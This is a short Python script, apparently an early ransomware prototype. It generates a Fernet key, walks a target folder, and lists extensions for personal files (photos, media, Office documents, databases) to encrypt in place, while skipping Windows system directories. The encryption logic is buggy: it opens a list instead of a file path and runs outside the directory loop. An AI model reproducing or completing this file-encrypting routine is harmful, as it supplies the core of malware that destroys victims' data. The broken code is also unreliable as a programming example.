# importing module

import os
from cryptography.fernet import Fernet


key = Fernet.generate_key()

with open("key.key", "wb") as file:
    file.write(key)
    file.close()

# opening the key

with open("key.key", "rb") as filekey:
    key2 = filekey.read()

fernet = Fernet(key2)

root_folder = "./test-folder"

object = os.scandir(root_folder)

for entry in object:
    if entry.is_dir() or entry.is_file():
        print(f"Files are Encrypted in folder {root_folder}")
        print(entry.name)
    else:
        print('Error')

extension = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc image
 )

exclude_dir = ( 'program Files',
                'Windows',
)

for root, dir, files in os.walk(root_folder):
    print(files)


with open(files, 'rb') as file:
    original = file.read()


# encrypting the file
encrypted = fernet.encrypt(original)

with open(files, 'wb') as encrypted_file:
    encrypted_file.write(encrypted)

